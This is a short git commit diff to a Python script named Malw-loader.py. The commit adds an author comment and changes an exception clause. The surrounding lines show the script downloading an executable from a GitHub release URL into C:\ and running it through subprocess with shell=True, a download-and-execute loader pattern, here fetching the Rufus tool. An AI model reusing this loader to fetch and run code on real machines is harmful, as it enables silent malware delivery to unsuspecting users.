2261abd85ab0e688bb1967428d9c5b72a9e9aa74
Cyber_Warrior <65919684+Syed-Sadam@users.noreply.github.com>
2020-05-25 13:00:23 -0700

    Update Malw-loader.py

--- Malw-loader.py
+++ Malw-loader.py
@@ -2,11 +2,13 @@ import subprocess
 import wget
 import time
 
+#Author: Syed Sadam Hussain Shah
+
 try:
     wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe', r'C:\\')
     time.sleep(5)
     subprocess.call(["C:\\rufus-3.9p.exe"], shell=True)
-except NotADirectoryError and FileNotFoundError and PermissionError:
+except PermissionError:
     pass
 
     try:
